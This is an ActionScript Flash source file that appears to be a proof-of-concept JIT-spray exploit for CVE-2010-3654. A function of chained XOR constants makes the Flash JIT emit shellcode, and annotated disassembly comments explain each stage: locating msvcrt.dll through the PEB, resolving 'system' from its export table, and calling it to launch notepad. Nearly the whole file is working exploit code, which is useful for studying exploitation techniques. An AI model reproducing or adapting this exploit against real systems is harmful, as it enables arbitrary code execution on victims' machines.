package {

	import flash.display.MovieClip

	public class Main extends MovieClip
	{

		function funcXOR1()
		{

			var ret = (
			
			// 3 addresses for CVE-2010-3654's dereferencing + NOP sled (unused, really)
			0x11223344^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^	
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^
			0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^0x3C909090^

			// Find msvcrt.dll's base address through the PEB
			// Most JIT xor bytes are not included
			//			
			// 00688931      33C0          XOR EAX,EAX
			// 00688933      B0 18         MOV AL,18
			// 00688935      8BF8          MOV EDI,EAX
			// 00688937      64:8B1F       MOV EBX,DWORD PTR FS:[EDI]
			// 0068893A      B0 30         MOV AL,30
			// 0068893C      8B1C18        MOV EBX,DWORD PTR DS:[EAX+EBX]
			// 0068893F      B0 0C         MOV AL,0C
			// 00688941      8B1C18        MOV EBX,DWORD PTR DS:[EAX+EBX]
			// 00688944      B0 1C         MOV AL,1C
			// 00688946      8B1C18        MOV EBX,DWORD PTR DS:[EAX+EBX]
			// 00688949      FC            CLD
			// 0068894A      33C9          XOR ECX,ECX
			// 0068894C      BA 6C356C00   MOV EDX,006C356C                                ;  XOR embedded
			// 00688951      B6 00         MOV DH,0
			// 00688953      52            PUSH EDX                                        
			// 00688954      BA 2E356400   MOV EDX,0064352E                                ;  XOR embedded
			// 00688959      B6 00         MOV DH,0
			// 0068895B      52            PUSH EDX                                        
			// 0068895C      BA 72357400   MOV EDX,00743572                                ;  XOR embedded
			// 00688961      B6 00         MOV DH,0
			// 00688963      52            PUSH EDX                                        
			// 00688964      BA 76356300   MOV EDX,00633576                                ;  XOR embedded
			// 00688969      B6 00         MOV DH,0
			// 0068896B      52            PUSH EDX                                        
			// 0068896C      BA 6D357300   MOV EDX,0073356D                                ;  XOR embedded
			// 00688971      B6 00         MOV DH,0
			// 00688973      52            PUSH EDX                                        
			// 00688974      B0 20         MOV AL,20
			// 00688976      8BF4          MOV ESI,ESP
			// 00688978      8B3C18        MOV EDI,DWORD PTR DS:[EAX+EBX]
			// 0068897B      B1 05         MOV CL,5
			// 0068897D      F3:A7         REPE CMPS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]
			// 0068897F      EB 01         JMP SHORT 00688982
			// 00688981      90            NOP                                             ;  XOR
			// 00688982      74 0A         JE SHORT 0068898E
			// 00688984      90            NOP
			// 00688985      90            NOP
			// 00688986      90            NOP                                             ;  XOR
			// 00688987      8B1B          MOV EBX,DWORD PTR DS:[EBX]
			// 00688989      90            NOP
			// 0068898A      90            NOP
			// 0068898B      90            NOP                                             ;  XOR
			// 0068898C      EB E0         JMP SHORT 00688976                              ;  The operand byte here takes into account the xors/nops
			// 0068898E      90            NOP                                             
			// 0068898F      B0 08         MOV AL,8
			// 00688991      8B1C18        MOV EBX,DWORD PTR DS:[EAX+EBX]                  ;  EBX now contains msvcrt.dll's base address

			// Find msvcrt.dll's base address and put it in EBX
			0x3C90C033^0x3C9018B0^0x3C90F88B^0x3C1F8B64^0x3C9030B0^0x3C181C8B^0x3C900CB0^0x3C181C8B^0x3C901CB0^0x3C181C8B^0x3C9090FC^0x6CBAC933^
			0x3C90006C^0x3C5200B6^0x2EBA9090^0x3C900064^0x3C5200B6^0x72BA9090^0x3C900074^0x3C5200B6^0x76BA9090^0x3C900063^0x3C5200B6^0x6DBA9090^
			0x3C900073^0x3C5200B6^0x3C9020B0^0x3C90F48B^0x3C183C8B^0x3C9005B1^0x01EBA7F3^0x3C900A74^0x3C901B8B^0x3C90E0EB^0x3C9008B0^0x3C181C8B^

			// Find the address of system using msvcrt.dll's export table
			// The code assumes the function exists, and will probably crash if it doesn't
			// Other assumptions on sizes of RVAs are also made (and noted in the code)
			// Most JIT xor bytes are not included
			//
			// 02650CA5    B0 3C           MOV AL,3C
			// 02650CA7    8B0418          MOV EAX,DWORD PTR DS:[EAX+EBX]                  ; Start of PE header (should be just 1 byte, but 2 is also fine)
			// 02650CAA    04 78           ADD AL,78
			// 02650CAC    EB 01           JMP SHORT 02650CAF
			// 02650CAE    90              NOP                                             ; XOR
			// 02650CAF    80D4 00         ADC AH,0                                        ; There shouldn't be an overflow here
			// 02650CB2    8B0418          MOV EAX,DWORD PTR DS:[EAX+EBX]                  ; Export dir
			// 02650CB5    8BD0            MOV EDX,EAX
			// 02650CB7    B1 1C           MOV CL,1C
			// 02650CB9    03D1            ADD EDX,ECX
			// 02650CBB    8B041A          MOV EAX,DWORD PTR DS:[EDX+EBX]                  ; Address of functions
			// 02650CBE    B1 04           MOV CL,4
			// 02650CC0    03D1            ADD EDX,ECX
			// 02650CC2    8B141A          MOV EDX,DWORD PTR DS:[EDX+EBX]                  ; Address of names
			// 02650CC5    B9 65350000     MOV ECX,3565
			// 02650CCA    B5 6D           MOV CH,6D
			// 02650CCC    51              PUSH ECX
			// 02650CCD    B9 73357374     MOV ECX,74733573
			// 02650CD2    B5 79           MOV CH,79
			// 02650CD4    51              PUSH ECX
			// 02650CD5    33C9            XOR ECX,ECX
			// 02650CD7    B1 07           MOV CL,7
			// 02650CD9    8BF4            MOV ESI,ESP                                     ; "system"
			// 02650CDB    8B3C1A          MOV EDI,DWORD PTR DS:[EDX+EBX]
			// 02650CDE    03FB            ADD EDI,EBX                                     ; Address of exported function name
			// 02650CE0    F3:A6           REPE CMPS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]
			// 02650CE2    EB 01           JMP SHORT 02650CE5
			// 02650CE4    90              NOP                                             ; XOR
			// 02650CE5    74 17           JE SHORT 02650CFE
			// 02650CE7    90              NOP
			// 02650CE8    90              NOP
			// 02650CE9    90              NOP                                             ; XOR
			// 02650CEA    B1 04           MOV CL,4
			// 02650CEC    90              NOP
			// 02650CED    3C 35           CMP AL,35                                       ; XOR
			// 02650CEF    03D1            ADD EDX,ECX
			// 02650CF1    90              NOP
			// 02650CF2    3C 35           CMP AL,35                                       ; XOR
			// 02650CF4    03C1            ADD EAX,ECX
			// 02650CF6    90              NOP
			// 02650CF7    3C 35           CMP AL,35                                       ; XOR
			// 02650CF9    EB D1           JMP SHORT 02650CD7                              ; The operand byte here takes into account the xors/nops
			// 02650CFB    90              NOP
			// 02650CFC    3C 35           CMP AL,35                                       ; XOR
			// 02650CFE    8B0418          MOV EAX,DWORD PTR DS:[EAX+EBX]
			// 02650D01    03D8            ADD EBX,EAX                                     ; EBX now holds the address of system

			// Find the address of system and put it in EBX
			0x3C903CB0^0x3C18048B^0x01EB7804^0x3C00D480^0x3C18048B^0x3C90D08B^0x3C901CB1^0x3C90D103^0x3C1A048B^0x3C9004B1^0x3C90D103^0x3C1A148B^
			0x65B99090^0x3C900000^0x3C516DB5^0x73B99090^0x3C907473^0x3C5179B5^0x3C90C933^0x3C9007B1^0x3C90F48B^0x3C1A3C8B^0x3C90FB03^0x01EBA6F3^
			0x3C901774^0x3C9004B1^0x3C90D103^0x3C90C103^0x3C90D1EB^0x3C18048B^0x3C90D803^
			
			// Run notepad using system (call ebx)
			0x3C90ec8b^0x3C909055^0x3C90ec8b^0x646170b8^0x000000b9^0x3c90c12b^0x3c909050^0x3f6f6eb8^0x0000b990^0x3c909030^0x3c90c103^0x3c909050^
			0x3cf8458d^0x3c909050^0x3ccd3ff);

			return ret;
		}
		
		function Main()
		{
			var ret1 = funcXOR1();
		}
	}
}